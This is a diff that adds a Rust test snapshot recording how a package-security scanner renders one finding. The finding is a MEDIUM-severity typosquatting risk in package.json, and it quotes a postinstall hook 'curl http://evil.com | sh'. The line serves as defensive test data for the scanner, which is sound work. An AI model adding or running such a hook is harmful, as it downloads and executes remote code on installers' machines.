@@ -1,0 +1,11 @@
+---
+source: crates/scanner-report/tests/renderer_test.rs
+assertion_line: 37
+expression: output
+---
+
+   MEDIUM   package.json
+           Typosquatting risk
+           > postinstall: curl http://evil.com | sh
+
+   SUSPICIOUS  1 finding(s)
